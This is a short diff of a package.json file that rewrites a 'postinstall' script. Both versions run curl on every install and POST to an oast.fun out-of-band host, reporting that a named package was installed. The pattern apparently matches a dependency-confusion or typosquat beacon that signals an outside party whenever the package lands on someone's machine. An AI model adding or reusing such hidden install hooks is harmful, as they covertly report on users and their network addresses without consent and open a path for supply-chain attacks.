@@ -1,5 +1,5 @@
 {
 "scripts": {
-  "postinstall": "curl -X POST 'http://ualemtwhjnfuiyibdavginia98b8az25y.oast.fun/log' -d 'User installed the amm-maths from TokenUnion by Polymarket'"
+  "postinstall": "curl -X POST 'http://ualemtwhjnfuiyibdavginia98b8az25y.oast.fun/log' -d 'User installed the keep3r-script from Mean-Finance by balmy-protocol'"
 }
 }
